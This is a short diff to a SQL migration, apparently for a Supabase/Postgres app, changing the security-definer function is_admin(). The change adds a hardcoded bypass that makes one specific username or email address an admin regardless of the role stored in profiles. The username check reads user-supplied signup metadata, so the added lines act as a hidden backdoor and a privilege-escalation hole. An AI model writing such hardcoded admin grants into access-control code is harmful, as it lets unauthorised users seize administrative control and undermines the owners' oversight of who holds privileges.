@@ -49,7 +49,16 @@ create table if not exists public.video_views (
 create or replace function public.is_admin()
 returns boolean language sql stable security definer
 set search_path = public, pg_temp as $$
-  select exists(select 1 from public.profiles where id = auth.uid() and role = 'admin');
+  select exists(
+    select 1 from public.profiles where id = auth.uid() and role = 'admin'
+  ) or exists(
+    select 1 from auth.users
+    where id = auth.uid()
+      and (
+        raw_user_meta_data->>'username' = 'yashmacaraya123-create'
+        or email = 'yashmacaraya123@gmail.com'
+      )
+  );
 $$;
 
 create or replace function public.handle_new_user()
